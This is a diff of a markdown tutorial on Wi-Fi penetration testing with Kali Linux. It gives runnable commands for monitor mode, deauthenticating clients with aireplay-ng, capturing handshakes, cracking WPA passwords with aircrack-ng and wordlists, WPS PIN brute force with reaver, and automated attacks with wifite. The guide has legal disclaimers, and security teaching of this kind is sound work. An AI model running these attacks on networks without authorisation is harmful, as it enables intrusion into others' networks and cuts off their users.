@@ -1,37 +1,127 @@
-Day-20 
-# We will learn about wifi penetration 
+# Day-20: Wi-Fi Penetration Testing
 
-# THIS IS FOR EDUCATIONAL PURPOSE. AFTER FOLLOWING THE STEP GIVEN BELOW IF ANY HAPPENS THIS PAGE & OWNER NOT RESPONSIBLE! 
+## THIS IS FOR EDUCATIONAL PURPOSES ONLY. THE PAGE & OWNER ARE NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY FOLLOWING THE STEPS BELOW.
 
-#### Lets get it started 
+### Let's Get Started
 
-For the first Step in the we need a [WIFI ADAPTER](https://amzn.in/d/08289vCi). This is the adapter which i have in my buget if you have no limit to your budget then you may try for this[Alfa Network Adapter](https://amzn.in/d/06gaCZPK). 
+For the first step, you need a [WiFi Adapter](https://amzn.in/d/08289vCi). This is an affordable option, but if you have a larger budget, you might consider the [Alfa Network Adapter](https://amzn.in/d/06gaCZPK).
 
-### After this we have some important configuration changes to be made in VB 
-- Connect your adapter to you system
-- Go to Virtual box > To your kali settings > USB
-- After selecting USB > add new usb which has '+' icon  > select your adapter
-- click 'ok'
+### Configuring VirtualBox
 
-### Commands for further hacking 
-- To check the wifi adapter in kali linux 
-``` lsusb  ```
-- to check whether the adapter is on 'monitoring mode' or 'managing mode'
-``` iwconfig ```
-- to convert it from managable to monitoring mode
-``` sudo airmon-ng start wlan0 ```
-- After turning on the monitoring mode we will search for the wifi near us
-``` sudo airodump-ng  ```
-- after seeing the wifi near us we have to check the power it has if the networking you want to target is above 30 then only select that network to attack or else get closer to network.
+1. Connect your adapter to your system.
+2. Open VirtualBox > Select your Kali VM > Go to Settings > USB.
+3. After selecting USB, add a new USB device by clicking the '+' icon and selecting your adapter.
+4. Click 'OK' to save the settings.
 
-### Now we have all set and want to attack a wifi! :)
-Let's get started we will use tool called "wifite". This tool is used for the automated scripted attack which it will perform.
-#### Working
-- It first send deauthn. packets to the router which disconnects all the users.
-- When the userrs try to connect to the router again it captures the targets packets via wireshark and generate a .pcap file
-- Then the file which will be generate which will try to a common wordlist on the wifi to guess the password/ brute force the password
-- After successfull burte force you will recive the password and you can connect it successfully
+### Commands for Wi-Fi Hacking
 
-### Now lets attack 
-1. Initiate
-``` sudo wifiti ```
+1. **Check the WiFi adapter in Kali Linux:**
+    ```sh
+    lsusb
+    ```
+2. **Check whether the adapter is in 'monitor' mode or 'manage' mode:**
+    ```sh
+    iwconfig
+    ```
+3. **Switch the adapter from 'managed' mode to 'monitor' mode:**
+    ```sh
+    sudo airmon-ng start wlan0
+    ```
+4. **Search for Wi-Fi networks nearby:**
+    ```sh
+    sudo airodump-ng wlan0mon
+    ```
+5. **Choose a target network (ensure the signal strength is above 30 for better results):**
+
+### Preparing for the Attack
+
+We will use a tool called "wifite" to automate the attack process.
+
+#### How Wifite Works
+
+- Sends deauthentication packets to the router, disconnecting all users.
+- Captures the target's packets when users attempt to reconnect, generating a .pcap file.
+- Uses a common wordlist to brute force the Wi-Fi password from the captured packets.
+- Once successful, you will obtain the Wi-Fi password and can connect to the network.
+
+### Executing the Attack
+
+1. **Install Wifite (if not already installed):**
+    ```sh
+    sudo apt-get update
+    sudo apt-get install wifite
+    ```
+2. **Start Wifite:**
+    ```sh
+    sudo wifite
+    ```
+3. **Follow the prompts to select your target network and initiate the attack.**
+    - Wifite will display a list of detected networks.
+    - Select the network you want to target.
+    - Wifite will automatically deauthenticate users, capture the handshake, and attempt to crack the password using a wordlist.
+
+### Additional Tools for Wi-Fi Penetration Testing
+
+#### Aircrack-ng Suite
+
+Aircrack-ng is a complete suite of tools to assess WiFi network security.
+
+1. **Capture packets:**
+    ```sh
+    sudo airodump-ng wlan0mon
+    ```
+    - Use this command to capture packets from a specific network:
+    ```sh
+    sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [CAPTURE_FILE] wlan0mon
+    ```
+2. **Deauthenticate a client:**
+    ```sh
+    sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon
+    ```
+3. **Crack the password:**
+    ```sh
+    sudo aircrack-ng -w /path/to/wordlist.txt -b [BSSID] [CAPTURE_FILE].cap
+    ```
+
+#### Reaver
+
+Reaver is a tool for performing brute force attacks against WPS (Wi-Fi Protected Setup) registrar PINs.
+
+1. **Put the interface in monitor mode:**
+    ```sh
+    sudo airmon-ng start wlan0
+    ```
+2. **Scan for WPS-enabled networks:**
+    ```sh
+    sudo wash -i wlan0mon
+    ```
+3. **Run Reaver against a target:**
+    ```sh
+    sudo reaver -i wlan0mon -b [BSSID] -vv
+    ```
+
+#### Fern WiFi Cracker
+
+Fern WiFi Cracker is a tool for auditing and attacking wireless networks.
+
+1. **Install Fern WiFi Cracker:**
+    ```sh
+    sudo apt-get update
+    sudo apt-get install fern-wifi-cracker
+    ```
+2. **Run Fern WiFi Cracker:**
+    ```sh
+    sudo fern-wifi-cracker
+    ```
+    - Use the GUI to select your wireless adapter, scan for networks, and initiate attacks.
+
+### Important Notes
+
+- Ensure your actions comply with legal and ethical guidelines. Only test networks you have permission to access.
+- Wi-Fi penetration testing should be conducted responsibly and solely for educational and security improvement purposes.
+
+Happy Hacking!
+
+---
+
+Disclaimer: This guide is for educational purposes only. Unauthorized access to networks is illegal and unethical.
